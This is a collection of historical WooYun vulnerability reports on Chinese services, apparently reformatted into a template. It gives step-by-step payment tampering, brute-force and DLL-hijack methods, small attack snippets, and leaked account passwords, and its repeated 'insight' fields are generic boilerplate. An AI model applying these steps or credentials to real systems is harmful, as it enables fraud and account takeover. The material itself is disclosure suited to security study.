**绕过**: 直接利用

**修复**: 0-9。简单
---

---
### [wooyun-2012-015301] 某IM软件客户端某功能设计存在严重缺陷。
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某IM软件客户端聊天记录漫游功能机制存在问题，笔者在另一台电脑上测试某互联网公司漫游记录功能，无需对用户密保进行认证可直接设置某互联网公司漫游聊天记录独立密码功能。危害：一旦用户密码泄露，若用户未设置其独立密码功能，可直接设置用户聊天记录独立密码，非会员可造成泄露所有好友1周聊天记录，某互联网公司会员则会泄露1个月聊天记录信息。如果用户使用某互联网公司进行商务办公、亲友聊天等等，包含在聊天记录中的敏感信息一旦泄露，可对用户自身造成重大影响。亲，你还在使用某互联网公司聊隐私信息吗啊？

**POC**: 具体测试过程如下：1.常用地:北京测试某互联网公司：4XXXXXX二代密保+某互联网公司会员。测试环境为某互联网公司2012正式版首先我们直接打开一个聊天框，选择聊天记录，漫游消息。直接跳出设置聊天记录独立密码。为了证明真实性，测试某互联网公司登陆某互联网公司安全中心(aq.某域名.com),页面显示二代密保，手机和邮箱均为绑定。具体测试过程，好友本地消息显示聊天记录为一页，我们直接设置了一个长达15位的密码。即可直接获取到与好友1个月的聊天记录，并且系统提示：尊敬的某互联网公司会员，已为您漫游全体好友30天的消息记录，您还可以永久漫游与该好友的消息记录。具体危害，大家可以想象的到，后文会提到具体利用过程。某互联网公司会员2代密保测试结果，成功!！！

**绕过**: 直接利用

**修复**: 加密保验证等等。。。。。其实我说的是，这个月没礼物了。： （乌云你看着办吧。
---

---
### [wooyun-2013-046939] 很多编译器使用有漏洞的CVTRES.EXE(建议更新)
**厂商**: 很多编译器共同问题 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 我自己构造的poc文件，把这些数据以16进制的形式保存*.RES,用相应资源编辑器打开就可以0000000020000000FFFF0000FFFF0000000000000000000000000000000000004E14000020000000FFFF0400FFFF6500000000003010040800000000000000000000000010008765F64E280026004600290000000000459C310031003100310031003100310031003100310031003100310031003100310031003100310031

**绕过**: 直接利用

**修复**: 用微软最新的CVTRES.EXE
---

---
### [wooyun-2013-018597] 某桌面软件专业版可能导致屏锁密码一些问题
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 总的意思来说，安装某桌面软件的一个屏锁功能之后，设置的访问密码就自动消除了卸载了之后 工作正常测试：某品牌手机。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2015-0148206] 新华社邮箱系统设计逻辑缺陷可撞库（账号证明）
**厂商**: 新华社 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mail.xinhua.org1q2w3e4r+top500暴力破解liyong 1q2w3e4r

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2012-04344] 某互联网公司2011及之前版本隐藏快捷键冲突，导致用户错按后，群窗口无故退出
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重现OS:windows xp/vista/7 中文版 均可重现步骤：1、打开某互联网公司20112、进入任意某互联网公司群3、在群聊窗口下，按下键盘组合键：alt+i+t4、在当前群发任意信息（文字、图片、混合均可）5、BUG出现。发送信息后，当前某互联网公司群窗口会自动关闭6、再打开该某互联网公司群7、BUG依旧PS:之所以是BUG，是因为某互联网公司在帮助文件和设置选项中，都没有对ALT+I+T这个组合键做任何的解释说明。但是一旦按了之后，对应的某互联网公司群都将出现自动关闭的情况，重装某互联网公司无效。临时解决方法（针对用户的）在出现问题的某互联网公司群窗口下，再次按ALT+I+T bug消失。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个。。。你们懂的~
---

---
### [wooyun-2016-0188580] P2P安全之指尖贷某几种安全问题
**厂商**: 意真（上海）金融信息服务有限公司 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、	https未校验证书客户端虽采用了https，但并未对服务端证书进行校验能够捕获通讯数据，可导致中间人攻击。

**POC**: 捕获登录通讯数据，其中登录密码仅采用MD5加密二、	重放数据退出登录后仍能重放数据，如登录、账户信息以及修改密码等都能重放。上图为重放修改登录密码数据三、	敏感信息（可查询他人账户信息）查询账户信息的业务数据主要参数为customerId与signature，该两项均保存于本地文件中（yizhen_money_users.xml），只需要获取该两项数据，即可查询他人账户信息。上图为获取他人账户信息，不需要对方登录或在线状态四、	组件拒绝服务调用以下组件能够导致应用崩溃，可能会被竞争对手利用，影响用户体验。adb shell am start com.android.yzloan/com.ume

**绕过**: 直接利用

**修复**: 你们懂的！
---

---
### [wooyun-2015-0110557] 结伴旅游交友网站支付漏洞，可1分钱购买VIP
**厂商**: 结伴旅游 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站地址https://example.com/[已脱敏]

**POC**: 先到支付界面，随便选个最贵的吧然后抓包，发现了吧，改下参数。19999改成0.01然后直接提交跳到这个页面了吧。直接某电商平台付款吧恩。。。付款吧。然后就是会员了。没有恶意。求退还一分钱····

**绕过**: 直接利用

**修复**: 支付流程很重要。
---

---
### [wooyun-2014-082848] 某旅游平台某接口接口缺陷可撞库（已测试部分数据）及短信轰炸
**厂商**: 某旅游平台旅行网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: BUG1、问题接口：https://example.com/[已脱敏] /globalwap/account/login/ HTTP/1.1Host: accounts.ctrip.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, de

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在登陆接口加个验证吧
---

---
### [wooyun-2015-096384] Iwebshop 最新版支付漏洞（1分钱任意买）
**厂商**: iWebShop | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到iwebshop在2015.01.26又更新了（v3.0.15011000），看了看更新说明，说已经修改了wooyun上的漏洞，就下下来研究一下。问题点：POST /index.php?controller=ucenter&action=payment_balance  用户在支付自己的订单时（预存款 支付），抓包修改价格，但是有一个数据校验，下面看看是如何突破检验的。文件在/controllers/ucenter.php的payment_balance()方法中function payment_balance(){$urlStr  = '';$user_id = intval($this->user['user_id']);$return['attach']     = IReq::get('attach');$return['total_fee']  = IReq::get('to

**POC**: 见详细说明

**绕过**: 过滤绕过

**修复**: 用户属性验证
---

---
### [wooyun-2015-0163435] 娜迦信息科技设计缺陷支付漏洞（看我如何花1元终身购）
**厂商**: nagain.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞描述：两件商品合并购买，一个数量为负值，一个为正数，这样就是凑成了1块钱危害等级：中漏洞详情：如图：选择1块钱的99个，10块钱的100个把1块钱的数量改为-99已经成功支付100套哦

**POC**: 已经成功支付

**绕过**: 直接利用

**修复**: 管理员帮我收回购买的吧
---

---
### [wooyun-2012-05420] 某互联网公司 某互联网公司、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司 某互联网公司、TM 远程读取内存数据漏洞、可导致远程溢出、拒绝服务攻击某互联网公司 某互联网公司、TM 聊天窗口远程读取对方进程内存数据漏洞、可导致远程溢出、拒绝服务攻击漏洞描述：这个我也不知道该下个什么定义、叫个什么名字好，暂且叫这个名字吧……这个漏洞挺狗血的，发现过程也很巧合。话说本站部分连接被伟大的GFW屏蔽了，所以在早上的时候，我把链接统一改成了一个很猥琐的格式……例如：https://example.com/[已脱敏] Url 地址完全错误！并且后边多了一串奇怪的字符……这顿时勾起了我的兴趣，于是乎把玩了一番，得出了如下结论……漏洞测试：测试环境：TM2009 Beta3.2 + IE9 + W

**POC**: 卧槽，实在是太长了，尼玛复制还不带自动复制图片的，靠……这是链接：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 某互联网公司自有方案……
---

---
### [wooyun-2015-0103150] 同程旅交汇低价支付高价订单（修复不完整可被绕过）
**厂商**: 某旅游公司 | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 同程工程师估计太忙，上次提交的漏洞只修改了部分WooYun: 同程旅交汇低价支付高价订单订单随意修改（另种支付漏洞隐患）其中修改lineid达到修改订单金额的地方反而没有修改，不知道是因为该地方不构成威胁还是另有原因，因为厂家已经公开了漏洞，既然看到了就再提一下吧，以免是因为疏漏忘记修改导致问题。

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0141784] 360免费WIFI加密签名破解获取他人无线明文密码(还可刷金币换运营商流量)
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一回合:加解密破除根据特征定位功能点代码根据 http 请求中method=Wifi.password 为特征,定位请求封装代码存在 qE 类中接下来对函数进行hook 分析追踪到其加密方式为DESede (DESede 是由DES对称加密算法改进后的一种对称加密算法。使用 168 位的密钥对资料进行三次加密的一种机制 ),实现类为 vA接下要做的就是定位DESede key 就可以破解完成 http 请求加解密的整个过程并且自己用代码实现.现在开始跟踪 key 的生成算法.从以下代码可以得知 init 中的 key 是由 public static String a(String arg2) 方法获取的. 从代码中得知 key 的生成实际是由com.qihoo.freewifi.utils.SecurityUtils完成的其中 getkey 是一个 native 方法 (可以看出 ap

**POC**: 有了上面的分析就可以自己写程序刷下金币了..再加上之前搞过万能钥匙...现在不用装两个应用.可以集成到一个 app 里啦.

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0164196] 回家吃饭某站设计逻辑缺陷可查看、修改所有（用户/ 商家/订单/菜品）信息
**厂商**: jiashuangkuaizi.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ##后台地址https://**.**.**.**##弱口令zhangxuejiao/123456wushuaishuai/123456liquanhui/123456lianbingbing/123456chencheng/123456zhangyi/123456liyun/123456yangyang/123456tang/123456

**POC**: ##漏洞证明其中tang疑似CEO唐万里帐号,就以这个帐号为例吧###98W用户列表###10W商家列表###23W订单列表###11W菜品列表其他帐号还有更多功能，这里就不贴图了，希望厂商能认识到弱口令的危害。

**绕过**: 直接利用

**修复**: 修改掉弱口令包括但不局限于类似hjcf123，jskz123，123456；定期修改密码；由上到下加强员工安全意识。
---

---
### [wooyun-2015-0143422] 保险安全之中国人寿某省公司逻辑漏洞可导致所有员工姓名、手机等敏感信息
**厂商**: 中国人寿 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司端 江苏国寿微助理点击然后 个人管理或者其他的都行会跳转到登陆我首先用8位的员工号来爆破发现是132开头的 那么我们只需要对132xxxxx的xxxxx进行爆破就可以了简单的爆破了下 6000员工！！！然后我来演示下 如何获取他的姓名信息输入手机号和验证码以后 点击获取验证码而且验证码还直接返回了！！！点到为止 不深入了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 完善逻辑
---

---
### [wooyun-2015-0129904] 某出行平台专车产品逻辑漏洞(导致可完全免费乘坐专车)
**厂商**: 小桔科技 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用大号邀请某虚拟号码注册某出行平台专车填入某虚拟号码手机号

**POC**: 可以得到相应代金券可以无限次累计获得

**绕过**: 直接利用

**修复**: 【修复方法】方法1：唯一身份识别，邀请者和被邀请者的唯一身份ID（手机号）和支付方式进行唯一性绑定。破解：临时充值车费即可突破该修复方法。方法二：邀请者和被邀请者，唯一身份ID（增加手机IMEI码），近一步提升突破门槛。破解：使用安卓手机，可随意修改IMEI码。
---

---
### [wooyun-2015-0130583] TourEx支付漏洞可低价购买高价旅游产品
**厂商**: TourEx | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在提交订单的时候，旅游产品的id和价格参数pricetype居然是分开的，并且提交的时候未做一致性的验证。导致可以用一个低价产品的pricetype来替换一个高价的pricetype

**POC**: tourex演示站上实验的先找一个便宜点的产品预定页面URL的pricetype，也就是下面的价格。如果直接在url里面改成其他的，就会出错，看来只能用burp来提交记住这个便宜点的pricetype：17，后面的c1就是成人，c2就是儿童再找个贵点的此时的pricetype为50，那个抵用的功能貌似只能在规定的pricetype下面使用修改提交数据，把pricetype从50改成17，c1=0&c2=1，儿童票更便宜嘛哈哈提交之后，给出了重定向的链接

**绕过**: 直接利用

**修复**: 添加验证，最好将id和pricetype绑定
---

---
### [wooyun-2013-018812] 推女郎某处设计不合格导致逻辑漏洞
**厂商**: tuigirl.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 话说在某社交平台认识了@beiju886 苏可可妹子。是和推女郎有合作。然后这期推出了可可的写真。抱着友好的心态进行测试（前几天就想了。猜是99%的几率可以成功）

**POC**: 看出有问题了直接get过去就好我的一毛能能报销吗？= =我已经没有继续下了。。不信可以看服务器日志。

**绕过**: 直接利用

**修复**: 这个你们比我还懂。验证金额的时候再严格一些。而且可以尽量有邮件来交互发送订阅。把东西放到web服务器上也是不好的。
---

---
### [wooyun-2013-028647] 某电商IM工具多个漏洞集合(dll劫持，可信路径问题以及拒绝服务等）
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、某电商IM工具几个低危Dll 劫持，不能导致远程代码执行，不过可能被病毒用来恶意启动2、某电商IM工具自定义主题拒绝服务3、某电商IM工具可信任路径漏洞

**POC**: 1、TBBrowserDownload.exe启动加载不存在的dwmapi.dll，AliIM.exe启动加载不存在的dwmapi.dll,wwutils.dll2、某电商IM工具自定义主题，当诱使用户使用畸形png图片当主题，可导致拒绝服务攻击3、某电商IM工具自定义主题，点击“更多主题”会导致可信任路径漏洞4、poc见https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1、加载dll使用绝对路径，不存在的dll不要加载2、使用最新的libpng库3、起浏览器进程时加双引号
---

---
### [wooyun-2013-043276] 来往软件惊现时光倒流事件！大家都做预言帝！
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昨天偶然间发现的洞，模块是安卓版的来往的分享功能。当然，我不知道苹果版有没有同样的问题，因为俺没有苹果手机，ipad也没有。听说来往挖洞送ipad，我就仅仅要个ipadmini就好了。俺的安卓手机系统时间错乱了，俺也懒得校对。不过，然后测试来往的分享功能的时候，奇迹就发生了，下面就是poc，详情见图~

**POC**: 见图，俺于11月8号就成功的预言了11月11日某电商平台的销售额是350亿，是不是很牛逼的赶脚？哈哈~~

**绕过**: 直接利用

**修复**: 不要轻易相信任何客户端提交的数据....发布时间还是以服务器端的时间为准吧~厂商，觉得俺做的来往摇一摇和来往机器人功能不错的话，就收购了吧。然后你们要是提供俺一个ipadmini的话，我还可以帮你们测试测试你们的苹果版程序有没有漏洞呢~
---

---
### [wooyun-2015-0109171] 某搜索引擎财富Android客户端设计缺陷可清除手势密码
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.手势密码的产生一般是为了解决用户手机不在手上或者遗失时避免被人直接登录帐号，造成资金损失，某搜索引擎财富客户端支持启用手势密码，但这个保护用户资金安全的功能设计上却有不少缺陷~2.某搜索引擎财富开启手势密码后，会保存用户设置的手势密码在/data/data/com.baidu.vsfinance/filesgesture_lock.obj 文件中3.仔细看两眼就会发现，手势密码其实是明文保存的，最后的x前的几位数字就是用户的手势密码

**POC**: 4.测试发现：只要修改此文件或者直接删除此文件就能清除手势密码（需要ROOT权限，但手势密码是争对手机不在用户手上的情况的，ROOT是分分钟的事，所以没啥利用条件）

**绕过**: 直接利用

**修复**: 多因素验证？
---

---
### [wooyun-2015-0157198] 云南大学办公系统设计逻辑缺陷
**厂商**: 云南大学 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://**.**.**.**/login.aspx?ReturnUrl=%2f无验证码可利用top500爆破 密码123456均可登录

**POC**: 证明：

**绕过**: 直接利用

**修复**: 提高安全意识
---

---
### [wooyun-2015-0128808] 中国图书网支付功能存在逻辑错误
**厂商**: 中国图书网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国图书网在线支付漏洞，购买订单传送给手机支付平台时用的是http协议，未做加密处理，可以抓包直接修改数据。注册账号购买一本9.8元的书加上20元的emis邮寄费，总共29.8元，提交订单点击手机支付，抓包，发现是http方式，把29.8元改成9.8元~数据被送到某运营商和包支付，显示9.8元。直接支付就可以了~~

**POC**: 注册账号购买一本9.8元的书加上20元的emis邮寄费，总共29.8元，提交订单点击手机支付，抓包，发现是http方式，把29.8元改成9.8元~数据被送到某运营商和包支付，显示9.8元。直接支付就可以了。

**绕过**: 直接利用

**修复**: 支付还是把http换成https吧~~
---

---
### [wooyun-2015-0153783] 某运营商某平台设计逻辑缺陷可进后台
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 为某运营商采购与招标网http://**.**.**.**/WebLoginAction.do?cmd=logout用户登录地区不需要验证码Burp抓了一下包发现用户名和密码都是明文post的于是用l开头的字典开始爆破，马上就有很多了找到一个叫liguangming的用户，密码为123456.为管理员账户就是这样

**POC**: 为某运营商采购与招标网http://**.**.**.**/WebLoginAction.do?cmd=logout用户登录地区不需要验证码Burp抓了一下包发现用户名和密码都是明文post的于是用l开头的字典开始爆破，马上就有很多了找到一个叫liguangming的用户，密码为123456.为管理员账户就是这样

**绕过**: 直接利用

**修复**: 添加验证码机制
---

---
### [wooyun-2015-0155088] 吉利汽车官方商城设计逻辑缺陷任意手机密码注册
**厂商**: 吉利控股集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1,http://**.**.**.**/index.php/regist  注册2,点击发送验证码,然后输入,再截获发送包,把号码修改为138888888883,好的,注册成功4,OK,就这样吧

**POC**: 如上

**绕过**: 直接利用

**修复**: Fix
---

---
### [wooyun-2015-0147092] 芒果TV客户端PC版调用函数漏洞（附演示）
**厂商**: hunantv.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 详情参见:http://**.**.**.**/bugs/wooyun-2013-038943启动HunanTV.exe的时候调用了 CreateProcess函数  且未用引号包含路径  默认安装在C盘 Program File目录下在安装芒果TV的盘下写入program.exe  启动主程序的时候program.exe会被调用执行！我在C盘根目录下放置了一个cmd.exe 并且重命名为 program.exe只要打开芒果TV   C盘的跟目录下program.exe就会被调用执行！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对传入给CreateProcess函数的名称和参数用双引号””进行包含
---

---
### [wooyun-2015-0113793] 来伊份支付漏洞
**厂商**: laiyifen.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 会发现这个是因为我习惯性抓包首先我们看到我的帐号里是没有余额的然后我们点进充值这里看到不多说了，最多充3000那我充个300吧此处使用burp抓包这里的amount应该是提交服务器的充值金额，改了就不用玩了，截获它的返回值圈起来的地方改成0.01一路run下去，成功跳出支付框支付成功回到主页面余额成功增加！！！下两袋鸭肫试试进入结算界面选择悠点卡支付可以看到余额完美下单完美扣除余额。完毕新人求邀请码，求rank，求礼物，求鸭肫。。。。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 老问题了，你们搞得定
---

---
### [wooyun-2013-038776] 某运营商某分站某处验证绕过可进行无限短信轰炸
**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 后端限制。
---

---
### [wooyun-2015-092372] 药房网主站修改密码逻辑漏洞
**厂商**: yaofang.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 这个漏洞利用需要用户登录，可以用在被XSS后或者其他情况这里只证明问题存在

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0142135] 链家地产某系统存在设计逻辑缺陷
**厂商**: homelink.com.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：www.ljabc.com.cn随便选个课程哎呦不便宜啊128元，这让我等小屌丝怎么承担的起，抓包看看？将金额部分该成1.00提交看看支付已经变成1元了。就不继续了

**POC**: 站点：www.ljabc.com.cn随便选个课程哎呦不便宜啊128元，这让我等小屌丝怎么承担的起，抓包看看？将金额部分该成1.00提交看看支付已经变成1元了。就不继续了

**绕过**: 直接利用

**修复**: 多加点验证机制。
---

---
### [wooyun-2013-022760] 网络卡牌游戏大掌门本地数据验证不严导致严重破坏游戏平衡网游变单机
**厂商**: 玩蟹科技 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本地数据aes加密,战斗过程没有网络验证下面代码主要作用是解密游戏的数据并进行修改和2次加密处理完成后直接覆盖游戏数据文件就可达到随意修改游戏的目的,from Crypto.Cipher import AESfrom Crypto import Randomimport osdef walk_dir(dirs):for root,dirs, files in os.walk( dirs ):for f in files:file_path = os.path.join( root,f )file_path='%s'%file_pathfile_md5 = fif file_path.endswith('.s') or file_path.endswith('.c'):encryptorDZM(file_path,file_path+'encry')try:encryptorDZM(file

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增强网络验证,祝大坑门越来越好.
---

---
### [wooyun-2013-018873] 好大夫在线-我是如何重置医生密码的！（逻辑缺陷）
**厂商**: 好大夫在线 | **年份**: 2013 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 程序猿能为您解决！
---

---
### [wooyun-2013-038158] 某搜索引擎手机浏览器缺陷可导致用户敏感数据泄漏(Android系统webkit内核问题t5内核浏览器无影响)
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Android平台某搜索引擎手机浏览器最新版恶意APP攻击代码：恶意APP可以先释放attack.html，然后打开SD卡中的恶意attack.html......public Intent getIntentForSE(String url) {Intent intent = new Intent("android.intent.action.VIEW");intent.setClassName("com.baidu.browser.apps", "com.baidu.browser.framework.BdBrowserActivity");intent.setData(Uri.parse(url));return intent;}try {String url = "file:///mnt/sdcard/attack.html";Intent intent1 = getIntentForS

**POC**: 用测试代码测试。

**绕过**: 直接利用

**修复**: 可以参考其他已修复该漏洞的手机浏览器的修复方法，如chrome安卓版等。
---

---
### [wooyun-2015-0150322] 魔方格主站验证码绕过撞库
**厂商**: mofangge.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

